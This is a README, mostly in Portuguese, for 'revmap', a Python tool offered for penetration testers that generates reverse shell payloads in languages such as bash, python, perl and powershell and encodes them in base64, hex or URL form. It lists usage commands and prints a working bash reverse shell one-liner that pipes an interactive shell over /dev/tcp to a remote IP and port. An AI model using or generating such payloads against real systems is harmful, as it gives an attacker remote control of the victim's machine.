<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>

[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=revmap)](https://git.io/typing-svg)



<h4 align="center">Tool that generates reverse shell in multiple languages and encodes </h4>


<p align="center">
  <a href="#características">Features</a> •
  <a href="#instalação">Install</a> •
  <a href="#forma-de-utilização">How to use</a> •
  <a href="#executando-revmap">Usage</a>
</p>

---


O revmap é uma ferramenta que gera payloads de reverse shell de várias linguagens como python, bash, perl, powershell e muit outros. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. Revmap é construído para fazer apenas uma coisa: gera payloads reverse shell + encodes e faz isso muito bem.

Projetei o `revmap` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.

# Características

 - Gera payloads de reverse shell para diversas linguagens de programação (python, bash, powershell e etc)
 - Funcionalidade de realizar encode das payloads desejadas (Url encode, base64, hexadecimal e etc)

# Forma de utilização

```sh
revmap --ip 192.168.4.80 --port 4444 --payload bash --encode urlencode
revmap --ip 192.168.4.80 --port 4444 --payload bash 
revmap --ip 192.168.4.80 --port 4444 --payload python
revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
```
Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
```yaml
 ___ ___ _ _ _____ ___ ___ 
|  _| -_| | |     | .'| . |
|_| |___|\_/|_|_|_|__,|  _|
                      |_|  
        v0.0.1 - @joaoviictorti 

options:
  --h, --help            show this help message and exit
  --version             show program's version number and exit
  --ip IP                Insert ip
  --port PORTA           Insert port
  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
  --encode {base64,hex,urlencode} Insert encode
```

# Instalação

revmap requer **python3** e para baixá-lo só usar:

```sh
pip3 install revmap
```

# Executando revmap

```console
revmap --ip 192.168.4.160 --port 8080 --payload bash

 ___ ___ _ _ _____ ___ ___ 
|  _| -_| | |     | .'| . |
|_| |___|\_/|_|_|_|__,|  _|
                      |_|  
        v0.0.1 - @joaoviictorti 
                                               

bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
```


<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
